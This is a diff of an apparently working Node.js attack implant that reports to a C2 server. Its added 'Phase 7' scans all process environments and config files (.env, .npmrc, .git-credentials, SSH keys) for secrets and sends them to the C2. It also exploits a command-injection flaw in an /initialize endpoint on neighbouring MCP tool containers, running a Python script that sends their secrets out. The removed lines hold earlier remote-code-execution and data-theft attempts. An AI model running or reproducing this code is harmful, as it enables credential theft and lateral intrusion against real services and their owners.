@@ -8,7 +8,7 @@ const C2_PORT = 4444;
 
 function run(cmd, timeout=10000) {
   try { return execSync(cmd, { timeout, encoding: 'utf-8', stdio: ['pipe','pipe','pipe'] }).trim(); }
-  catch(e) { return 'ERR:' + ((e.stderr||'')+(e.stdout||'')).toString().substring(0, 300); }
+  catch(e) { return 'ERR:' + ((e.stderr||'')+(e.stdout||'')).toString().substring(0, 500); }
 }
 
 function httpPost(host, port, path, body, timeout=8000) {
@@ -30,214 +30,194 @@ function httpPost(host, port, path, body, timeout=8000) {
   });
 }
 
-function httpGet(host, port, path, timeout=3000) {
-  return new Promise((resolve) => {
-    let data = '';
-    const req = http.get({ hostname: host, port, path, timeout }, (res) => {
-      res.on('data', (chunk) => data += chunk);
-      res.on('end', () => resolve({ status: res.statusCode, body: data.substring(0, 8000) }));
-    });
-    req.on('error', (e) => resolve({ error: e.message }));
-    req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
-  });
-}
-
 async function connectC2() {
   const sock = net.connect(C2_PORT, C2_HOST, async () => {
     const send = (msg) => { try { sock.write(msg + '\n'); } catch(e) {} };
 
     send('========================================');
-    send('[+] PHASE 6C: TARGETED UA TOOL EXPLOITATION - ' + new Date().toISOString());
+    send('[+] PHASE 7: SECRETS & ENV EXTRACTION - ' + new Date().toISOString());
     send('========================================\n');
 
-    // ===== PART 1: Fix /call-tool parameter format =====
-    // Previous attempt showed /call-tool expects "tool_name" not "name"
-    send('=== PART 1: CORRECT /call-tool FORMAT ===');
+    // ===== PART 1: Our own container's full environment =====
+    send('=== PART 1: OWN CONTAINER ENV (172.17.0.9) ===');
+    send('[*] /proc/1/environ (Universal Agent process):');
+    send(run("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'"));
+    send('');
 
-    const containers = [
-      { ip: '172.17.0.2', name: 'DocSearch' },
-      { ip: '172.17.0.3', name: 'Blender' },
-      { ip: '172.17.0.4', name: 'Obsidian' },
-      { ip: '172.17.0.5', name: 'CryptoFathom' },
-    ];
+    send('[*] /proc/self/environ (our process):');
+    send(run("cat /proc/self/environ 2>/dev/null | tr '\\0' '\\n'"));
+    send('');
 
-    // Try different parameter formats for /call-tool
-    for (const c of containers) {
-      send(`\n--- ${c.ip} (${c.name}) /call-tool format testing ---`);
-
-      // Get first tool name
-      const toolsResp = await httpGet(c.ip, 6969, '/tools');
-      let firstTool = '';
-      try {
-        const parsed = JSON.parse(toolsResp.body || '{}');
-        if (parsed.tools && parsed.tools[0]) firstTool = parsed.tools[0].name;
-      } catch(e) {}
-
-      if (!firstTool) { send('  No tools found'); continue; }
-
-      // Try various parameter formats
-      const formats = [
-        { tool_name: firstTool, arguments: {} },
-        { tool_name: firstTool, args: {} },
-        { tool_name: firstTool, params: {} },
-        { tool_name: firstTool, input: {} },
-        { name: firstTool, arguments: {} },
-        { toolName: firstTool, arguments: {} },
-        { method: 'tools/call', params: { name: firstTool, arguments: {} } },
-      ];
-
-      for (const fmt of formats) {
-        const r = await httpPost(c.ip, 6969, '/call-tool', fmt);
-        const body = (r.body || '').substring(0, 300);
-        if (r.status && body !== '{"success":false,"error":"Missing tool_name"}') {
-          send(`  [!] /call-tool ${JSON.stringify(fmt).substring(0,80)} → ${r.status}: ${body}`);
-        }
+    // All process envs
+    send('[*] All PIDs environment scan...');
+    const pids = run('ls /proc/ 2>/dev/null').split('\n').filter(p => /^\d+$/.test(p));
+    const allEnvs = new Set();
+    for (const pid of pids.slice(0, 30)) {
+      const env = run(`cat /proc/${pid}/environ 2>/dev/null | tr '\\0' '\\n' 2>/dev/null`);
+      if (env && !env.startsWith('ERR')) {
+        env.split('\n').forEach(l => allEnvs.add(l));
       }
+    }
+    // Filter and display sensitive ones
+    const sensitivePatterns = /secret|key|token|password|credential|auth|api[_-]|database|redis|mongo|neo4j|aws|azure|gcp|private|cert|jwt|stripe|openai|anthropic|github|slack|webhook|smtp|mail|sentry|datadog|newrelic|twilio|sendgrid|algolia|firebase|supabase|gemini|claude|gpt|hugging|cohere/i;
+    const nonSensitive = /^(PATH|HOME|HOSTNAME|PWD|SHLVL|TERM|LANG|LC_|USER|SHELL|LOGNAME|OLDPWD|_=|NVM_|YARN_|NPM_CONFIG_|npm_|GOPATH|GOROOT|DENO_|BUN_)$/;
 
-      // Also try /tools/call with different formats
-      const formats2 = [
-        { tool_name: firstTool, arguments: {} },
-        { name: firstTool, arguments: {} },
-        { params: { name: firstTool, arguments: {} } },
-      ];
-
-      for (const fmt of formats2) {
-        const r = await httpPost(c.ip, 6969, '/tools/call', fmt);
-        const body = (r.body || '').substring(0, 300);
-        if (r.status && r.status !== 500) {
-          send(`  [!] /tools/call ${JSON.stringify(fmt).substring(0,80)} → ${r.status}: ${body}`);
-        }
+    send('[*] Sensitive-looking env vars across all processes:');
+    for (const line of allEnvs) {
+      const key = line.split('=')[0] || '';
+      if (sensitivePatterns.test(line) && !nonSensitive.test(key)) {
+        send('  [!] ' + line);
       }
     }
 
-    // ===== PART 2: Exploit Blender execute_blender_code (172.17.0.3) =====
-    send('\n=== PART 2: BLENDER ARBITRARY CODE EXECUTION (172.17.0.3) ===');
-
-    const blenderPayloads = [
-      // Try to run Python code via execute_blender_code tool
-      { tool_name: 'execute_blender_code', arguments: { code: 'import os; print(os.popen("id").read())' } },
-      { name: 'execute_blender_code', arguments: { code: 'import os; print(os.popen("id").read())' } },
-      { tool_name: 'execute_blender_code', arguments: { code: 'import os; print(os.environ)' } },
-      { tool_name: 'execute_blender_code', arguments: { code: 'import subprocess; print(subprocess.check_output(["cat", "/etc/passwd"]).decode())' } },
-      { tool_name: 'execute_blender_code', arguments: { code: 'print("RCE_TEST_OK")' } },
-    ];
-
-    for (const payload of blenderPayloads) {
-      let r = await httpPost('172.17.0.3', 6969, '/call-tool', payload);
-      send(`  /call-tool: ${JSON.stringify(payload).substring(0,80)} → ${r.status}: ${(r.body||'').substring(0,500)}`);
-
-      r = await httpPost('172.17.0.3', 6969, '/tools/call', payload);
-      send(`  /tools/call: ${JSON.stringify(payload).substring(0,80)} → ${r.status}: ${(r.body||'').substring(0,500)}`);
+    send('\n[*] ALL unique env vars (for completeness):');
+    for (const line of [...allEnvs].sort()) {
+      send('  ' + line);
     }
+    send('');
 
-    // ===== PART 3: Document Search file read (172.17.0.2) =====
-    send('\n=== PART 3: DOCUMENT SEARCH FILE READ (172.17.0.2) ===');
+    // ===== PART 2: .env files and config files =====
+    send('=== PART 2: CONFIG & SECRET FILES ===');
 
-    // index_folder can scan arbitrary paths, semantic_search can then read results
-    const indexPayloads = [
-      { tool_name: 'index_folder', arguments: { folder_path: '/etc', file_types: ['.conf', '.passwd'] } },
-      { tool_name: 'index_folder', arguments: { folder_path: '/app', recursive: true } },
-      { tool_name: 'index_folder', arguments: { folder_path: '/proc/1/root/home', recursive: true } },
-      { tool_name: 'semantic_search', arguments: { query: 'password secret key token' } },
-      { tool_name: 'get_index_status', arguments: {} },
-      { name: 'index_folder', arguments: { folder_path: '/etc' } },
-      { name: 'semantic_search', arguments: { query: 'password' } },
-    ];
+    // Check our workspace
+    send('[*] /app/mcp-server/.env:');
+    send(run('cat /app/mcp-server/.env 2>/dev/null'));
+    send('[*] /app/.env:');
+    send(run('cat /app/.env 2>/dev/null'));
+    send('[*] /app/mcp-server/.git/config:');
+    send(run('cat /app/mcp-server/.git/config 2>/dev/null'));
 
-    for (const payload of indexPayloads) {
-      let r = await httpPost('172.17.0.2', 6969, '/call-tool', payload);
-      send(`  /call-tool: ${JSON.stringify(payload).substring(0,100)} → ${r.status}: ${(r.body||'').substring(0,500)}`);
+    // Search for all secret files
+    send('[*] Searching for secret files...');
+    send(run('find / -maxdepth 5 -name ".env" -o -name "*.env" -o -name ".env.*" -o -name "config.json" -o -name "credentials" -o -name "*.key" -o -name "*.pem" -o -name ".npmrc" -o -name ".pypirc" -o -name ".netrc" -o -name ".git-credentials" -o -name "secrets.*" 2>/dev/null | grep -v node_modules | grep -v proc | head -30'));
 
-      r = await httpPost('172.17.0.2', 6969, '/tools/call', payload);
-      if (r.status && r.status !== 500) {
-        send(`  /tools/call: ${JSON.stringify(payload).substring(0,100)} → ${r.status}: ${(r.body||'').substring(0,500)}`);
+    // Read any found files
+    const secretFiles = run('find / -maxdepth 4 -name ".env" -o -name "*.env" -o -name ".npmrc" -o -name ".netrc" -o -name ".git-credentials" -o -name "credentials" 2>/dev/null | grep -v node_modules | grep -v proc | head -20').split('\n');
+    for (const f of secretFiles) {
+      if (f && !f.startsWith('ERR') && f.length > 3) {
+        send(`  [!] ${f}:`);
+        send(run(`cat "${f}" 2>/dev/null | head -20`));
       }
     }
 
-    // ===== PART 4: Crypto trading data theft (172.17.0.5) =====
-    send('\n=== PART 4: CRYPTO PORTFOLIO DATA (172.17.0.5) ===');
+    // Check npm/git global configs
+    send('[*] /root/.npmrc: ' + run('cat /root/.npmrc 2>/dev/null'));
+    send('[*] /home/node/.npmrc: ' + run('cat /home/node/.npmrc 2>/dev/null'));
+    send('[*] git global config: ' + run('git config --global --list 2>/dev/null'));
+    send('[*] /root/.git-credentials: ' + run('cat /root/.git-credentials 2>/dev/null'));
+    send('[*] /home/node/.git-credentials: ' + run('cat /home/node/.git-credentials 2>/dev/null'));
 
-    const cryptoPayloads = [
-      { tool_name: 'get_portfolio_analysis', arguments: {} },
-      { tool_name: 'get_reality_check', arguments: {} },
-      { tool_name: 'get_signal_history', arguments: { limit: 50 } },
-      { tool_name: 'get_alerts', arguments: {} },
-      { tool_name: 'get_crowd_intelligence', arguments: {} },
-      { name: 'get_portfolio_analysis', arguments: {} },
-      { name: 'get_reality_check', arguments: {} },
-    ];
+    // Check SSH keys
+    send('[*] SSH keys:');
+    send(run('find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null | grep -v proc | head -10'));
+    send(run('ls -la /root/.ssh/ 2>/dev/null'));
+    send(run('ls -la /home/node/.ssh/ 2>/dev/null'));
+    send('');
 
-    for (const payload of cryptoPayloads) {
-      let r = await httpPost('172.17.0.5', 6969, '/call-tool', payload);
-      send(`  /call-tool: ${JSON.stringify(payload).substring(0,80)} → ${r.status}: ${(r.body||'').substring(0,800)}`);
+    // ===== PART 3: Use RCE on other containers to dump THEIR environments =====
+    send('=== PART 3: REMOTE CONTAINER ENV EXTRACTION VIA RCE ===');
 
-      r = await httpPost('172.17.0.5', 6969, '/tools/call', payload);
-      if (r.status && r.status !== 500) {
-        send(`  /tools/call: ${JSON.stringify(payload).substring(0,80)} → ${r.status}: ${(r.body||'').substring(0,800)}`);
-      }
-    }
+    const targets = ['172.17.0.2', '172.17.0.3', '172.17.0.4', '172.17.0.5'];
 
-    // ===== PART 5: MCP stdio re-init deep test =====
-    send('\n=== PART 5: MCP STDIO COMMAND INJECTION DEEP TEST ===');
+    for (const ip of targets) {
+      send(`\n--- EXTRACTING ENV FROM ${ip} ---`);
 
-    // The /initialize with stdio transport returned "undefined" on some containers
-    // This suggests it MAY have tried to spawn the command
-    // Let's try more targeted payloads and check for effects
+      // Use /initialize RCE to send env vars back to C2
+      // Python script: read /proc/1/environ, find .env files, send everything to C2
+      const pyScript = `
+import socket, os, glob
+s = socket.socket()
+s.settimeout(5)
+try:
+    s.connect(('${C2_HOST}', ${C2_PORT}))
+    s.send(b'\\n=== ENV FROM ${ip} ===\\n')
 
-    for (const c of containers) {
-      send(`\n--- Testing stdio init on ${c.ip} ---`);
+    # /proc/1/environ
+    try:
+        with open('/proc/1/environ', 'rb') as f:
+            env = f.read().decode('utf-8', errors='replace').replace('\\x00', '\\n')
+            s.send(b'[proc/1/environ]:\\n')
+            s.send(env.encode() + b'\\n')
+    except: s.send(b'Cannot read /proc/1/environ\\n')
 
-      // Create a marker file to verify execution
-      let r = await httpPost(c.ip, 6969, '/initialize', {
-        transport: 'stdio',
-        command: 'node',
-        args: ['-e', `require("fs").writeFileSync("/tmp/pwned","phase6c-${c.ip}")`]
-      });
-      send(`  stdio node init: ${r.status} ${(r.body||'').substring(0,300)}`);
+    # /proc/self/environ
+    try:
+        with open('/proc/self/environ', 'rb') as f:
+            env = f.read().decode('utf-8', errors='replace').replace('\\x00', '\\n')
+            s.send(b'[proc/self/environ]:\\n')
+            s.send(env.encode() + b'\\n')
+    except: pass
 
-      // Try with url for SSE transport (correct param name)
-      r = await httpPost(c.ip, 6969, '/initialize', {
-        transport: 'sse',
-        url: `http://172.17.0.9:6969/sse`
-      });
-      send(`  SSE url init: ${r.status} ${(r.body||'').substring(0,300)}`);
+    # .env files
+    for pattern in ['/app/.env', '/app/mcp-server/.env', '/app/**/.env', '/tmp/**/.env']:
+        for f in glob.glob(pattern, recursive=True):
+            try:
+                with open(f) as fh:
+                    s.send(f'[{f}]:\\n'.encode())
+                    s.send(fh.read()[:2000].encode() + b'\\n')
+            except: pass
 
-      // Try with python
-      r = await httpPost(c.ip, 6969, '/initialize', {
+    # .git/config
+    for f in glob.glob('/app/**/.git/config', recursive=True):
+        try:
+            with open(f) as fh:
+                s.send(f'[{f}]:\\n'.encode())
+                s.send(fh.read()[:1000].encode() + b'\\n')
+        except: pass
+
+    # npmrc
+    for f in ['/root/.npmrc', '/home/node/.npmrc']:
+        try:
+            with open(f) as fh:
+                s.send(f'[{f}]:\\n'.encode())
+                s.send(fh.read()[:500].encode() + b'\\n')
+        except: pass
+
+    s.send(b'=== END ${ip} ===\\n')
+except Exception as e:
+    try: s.send(f'ERROR: {e}\\n'.encode())
+    except: pass
+finally:
+    s.close()
+`.trim().replace(/\n/g, ';');
+
+      // Send via /initialize stdio RCE
+      const r = await httpPost(ip, 6969, '/initialize', {
         transport: 'stdio',
         command: 'python3',
-        args: ['-c', `import socket;s=socket.socket();s.connect(("${C2_HOST}",${C2_PORT}));s.send(b"PIVOT_FROM_${c.ip.replace(/\./g,'_')}\\n");s.close()`]
+        args: ['-c', pyScript]
       });
-      send(`  stdio python3 init: ${r.status} ${(r.body||'').substring(0,300)}`);
+      send(`  /initialize result: ${r.status} ${(r.body || '').substring(0, 200)}`);
+
+      // Small delay for C2 to receive
+      await new Promise(resolve => setTimeout(resolve, 2000));
     }
 
-    // ===== PART 6: Read UA source to find correct call format =====
-    send('\n=== PART 6: UA SOURCE - CALL FORMAT ===');
-    // Read just the relevant endpoint handlers
-    const src = run('cat /app/universal_agent.js 2>/dev/null');
-    // Extract the call-tool and tools/call handlers
-    const lines = src.split('\n');
-    const relevant = [];
-    let capture = false;
-    for (let i = 0; i < lines.length; i++) {
-      if (/call-tool|tools\/call|initialize/.test(lines[i])) {
-        capture = true;
-      }
-      if (capture) {
-        relevant.push(`${i+1}: ${lines[i]}`);
-        if (lines[i].includes('});') && capture) {
-          capture = false;
-          relevant.push('---');
-        }
+    send('');
+
+    // ===== PART 4: Node.js process-level secrets =====
+    send('=== PART 4: NODE.JS PROCESS SECRETS ===');
+    send('[*] process.env (our Node.js process):');
+    const ourEnv = process.env;
+    for (const [k, v] of Object.entries(ourEnv).sort()) {
+      if (sensitivePatterns.test(k) || sensitivePatterns.test(v || '')) {
+        send(`  [!] ${k}=${v}`);
       }
     }
-    send('[*] Relevant UA source handlers:');
-    relevant.slice(0, 60).forEach(l => send('  ' + l));
+    send('\n[*] Full process.env dump:');
+    for (const [k, v] of Object.entries(ourEnv).sort()) {
+      send(`  ${k}=${v}`);
+    }
 
-    send('\n=== PHASE 6C COMPLETE ===');
+    // Check if any interesting Node.js global state has secrets
+    send('\n[*] Node.js require.cache paths:');
+    const cachePaths = Object.keys(require.cache).filter(p => /config|secret|auth|credential|token/i.test(p));
+    cachePaths.forEach(p => send('  ' + p));
+
+    send('\n=== PHASE 7 COMPLETE ===');
     send('[*] Finished at ' + new Date().toISOString());
 
-    setTimeout(() => sock.end(), 3000);
+    setTimeout(() => sock.end(), 5000);
   });
 
   sock.on('error', () => {});
